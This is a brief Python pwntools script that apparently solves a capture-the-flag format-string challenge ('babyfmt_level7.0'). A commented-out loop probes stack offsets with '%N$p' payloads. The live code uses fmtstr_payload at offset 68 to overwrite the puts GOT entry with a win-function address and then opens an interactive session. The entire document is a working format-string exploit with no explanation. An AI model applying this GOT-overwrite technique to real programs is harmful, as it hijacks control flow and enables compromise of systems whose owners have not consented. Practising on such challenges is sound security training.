from pwn import *
elf = context.binary = ELF("/challenge/babyfmt_level7.0")
# for i in range(0,100):
#     p = process()
#     p.recv()
#     log.info("Current position: %d",i)
#     payload = b'A'*4 + b'B'*8 + str('%{}$p'.format(i)).encode()
#     p.sendline(payload)
#     time.sleep(0.2)
#     msg = p.recv()
#     print(msg.decode())
#     if b'414141' in msg: break
#     p.close()
p = process()
put_got = elf.got['puts']
win_func = p64(0x0000000000401554)
payload = fmtstr_payload(68,{put_got:win_func})
log.info("Putgot: %s", hex(put_got))
p.sendline(payload)
p.interactive()
#input:68
